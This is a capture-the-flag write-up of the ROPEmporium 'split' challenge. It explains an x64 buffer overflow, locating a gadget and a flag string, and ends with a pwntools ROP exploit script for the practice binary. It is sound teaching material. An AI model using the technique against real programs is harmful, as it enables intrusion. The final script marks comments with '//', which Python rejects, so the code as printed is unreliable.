---
toc: true
toc_label: "Table of Contents"
toc_icon: "list"
title: "ROPEmporium: split"
---
## Preface
'split' focuses on basic ROP, utilizing gadgets to populate registers in order to call a function in x64 with function parameters.

Challenges can be found [here](https://ropemporium.com/).
### File Information
Running the file, we are met with the following:

![Initial Run]({{ site.url }}{{ site.baseurl }}/assets/images/ropemporium/split/initialrun.png)

Note that the buffer overflow still exists (offset is the same), allowing us to overwrite the return address. However, this time around the handy function that prints the flag for us is gone.

Our checksec remains the same.

![Checksec]({{ site.url }}{{ site.baseurl }}/assets/images/ropemporium/split/checksec.png)
### Decompilation
Instead of the previous `ret2win()`, we are given a function that calls `system("/bin/ls")`. By itself, this wouldn't be useful, but since the call to `system()` exists, we can replace our return address with this call and instead pass our own arguments to it.

```c
void usefulFunction(void)
{
  system("/bin/ls");
  return;
}
```
### Finding Gadgets and Strings
Note that the problem description tells us this:
>I'll let you in on a secret: that useful string "/bin/cat flag.txt" is still present in this binary, as is a call to system(). It's just a case of finding them and chaining them together to make the magic happen.

We can verify that this is true by checking the offset of this string using the built-in pwndbg `search` function. We'll break at `main()` and search for our value.

![Search]({{ site.url }}{{ site.baseurl }}/assets/images/ropemporium/split/search.png)

Now we have the exact address of this string, we can find the gadgets necessary to load our registers so that we can call `system()` with this value.

To do this, we'll use ROPgadget. A quick reminder that the x64 calling convention is as follows:

`RDI, RSI, RDX, RCX, R8 and R9`

Since we only have one argument (`"/bin/cat flag.txt"`), we just need a gadget to load the RDI register with this value for us. ROPgadget is easily able to find the address of this for us.

![Pop RDI]({{ site.url }}{{ site.baseurl }}/assets/images/ropemporium/split/poprdi.png)

Luckily, this gadget doesn't have any other registers involved, so all we have to do is add the address of our string to build our chain.
### Finding Offset of system()
To find the offset of system, we'll use GDB to check the exact address of the function call.

![System Offset]({{ site.url }}{{ site.baseurl }}/assets/images/ropemporium/split/systemoffset.png)

Perfect, now we can build our ROP chain!
### Building ROP chain
A quick recap:
We need to first call our `POP_RDI` gadget with the address of our cat string. Then, we need to call system directly with our register already set, and we're done.

Looks like this time around, we don't need an extra ret since our stack is luckily already aligned. Note that if your exploit is segfaulting, try checking what instruction you break on. If it's MOVAPS, try adding a ret.

![Win]({{ site.url }}{{ site.baseurl }}/assets/images/ropemporium/split/win.png)
### Final Script
```python
from pwn import *

p = process('./split')

CAT_FLAG = 0x601060
POP_RDI = 0x00000000004007c3
SYSTEM = 0x40074b
payload = b'A'*40
payload += p64(POP_RDI) // loading our register
payload += p64(CAT_FLAG) // fed into POP_RDI
payload += p64(SYSTEM)
p.sendline(payload)
p.interactive()
```
